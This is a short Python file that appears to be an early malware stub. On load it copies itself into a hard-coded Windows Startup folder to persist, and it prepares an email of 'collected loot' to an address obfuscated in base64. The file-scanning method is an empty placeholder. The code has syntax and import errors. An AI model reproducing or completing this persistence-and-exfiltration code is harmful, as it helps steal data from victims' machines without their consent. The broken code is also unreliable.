from shutil import copy
from EmailSender import EmailSender,EMAIL_ADRESS, PASSWORD
from os import path, getcwd, scandir
from sys import platform
from base64 import b64decode
startUpShell = "C:\\Users\\pc\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"



class _Installer:
    try:
        currentDir = "\\".join(__file__.split('\\')[:-1])
    except:
        try:
            currentDir = getcwd()
        except:
            exit(1)
    if platform == 'win32':
        if currentDir != startUpShell:
            copy(__file__, startUpShell)

class Sender:
    def __init__(self):
        self.Sender = EmailSender(EMAIL_ADRESS, PASSWORD, Debug=False)
        self.headers = {
        "subject": "Crypt0101, Exploit0101"
        "to": base64.b64decode(b"YXptb3VkaEBnbWFpbC5jb20=").decode("utf-8")
        "Content": "collected loot"
        }
        self.Sender.setMessage(self.headers["subject"], self.headers["to"], self.headers["Content"])
    def scanner(self):
        pass

# _Installer()